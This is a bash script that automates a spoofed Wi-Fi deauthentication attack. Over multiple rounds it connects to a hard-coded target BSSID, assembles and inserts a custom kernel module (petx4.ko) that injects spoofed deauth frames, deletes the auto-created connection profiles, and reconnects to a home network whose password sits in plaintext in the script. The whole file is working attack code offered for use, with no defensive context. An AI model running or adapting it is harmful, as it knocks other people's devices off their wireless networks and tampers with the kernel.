#!/bin/bash
# deauth_pe_v3.sh - Reliable multi-round deauth using nmcli device wifi connect
#
# Usage: sudo bash /tmp/deauth_pe_v3.sh [rounds]

ROUNDS=${1:-10}
TARGET_BSSID="04:67:61:D6:DC:92"
TARGET_BSSID_LC="04:67:61:d6:dc:92"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"

echo "[*] Spoofed deauth attack - $ROUNDS rounds"

cd /tmp
[ -f petx4.ko ] || { as -o petx4.o petx4.S && ld -r -o petx4.ko petx4.o; }

DEAUTH_COUNT=0
SUCCESS_ROUNDS=0

for round in $(seq 1 $ROUNDS); do
    echo -n "[Round $round/$ROUNDS] "

    # Connect to target via nmcli device wifi connect (by BSSID)
    nmcli device wifi connect "$TARGET_BSSID" password "dummypassword12345678" ifname wlan0 2>/dev/null &
    PID=$!

    # Poll for connection
    OK=0
    for i in $(seq 1 100); do
        if dmesg | tail -3 | grep -q "connected to $TARGET_BSSID_LC"; then
            OK=1
            break
        fi
        sleep 0.1
    done

    if [ $OK -eq 0 ]; then
        echo "FAIL (no connect)"
        kill $PID 2>/dev/null; wait $PID 2>/dev/null
        # Quick reconnect home
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 2
        continue
    fi

    SUCCESS_ROUNDS=$((SUCCESS_ROUNDS + 1))

    # Send up to 3 spoofed deauths
    BURST=0
    for b in 1 2 3; do
        rmmod kfind 2>/dev/null || true
        insmod /tmp/petx4.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
            BURST=$((BURST + 1))
            rmmod kfind 2>/dev/null || true
            sleep 0.15
        else
            break
        fi
    done
    echo "OK ($BURST deauths, total=$DEAUTH_COUNT)"

    # Kill nmcli and reconnect home
    kill $PID 2>/dev/null; wait $PID 2>/dev/null

    # Delete auto-created profile
    nmcli connection delete "$(nmcli -t -f NAME connection show | grep -v 9899 | grep -v lo | grep -v waydroid | head -1)" 2>/dev/null || true

    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    sleep 2
done

echo ""
echo "[*] === RESULTS ==="
echo "[*] $DEAUTH_COUNT spoofed deauths in $SUCCESS_ROUNDS/$ROUNDS rounds"
echo "[*] Log:"
dmesg | grep "Deauth TX.*ff:ff:ff.*from 04:67:61" | tail -30
echo "[*] Done."
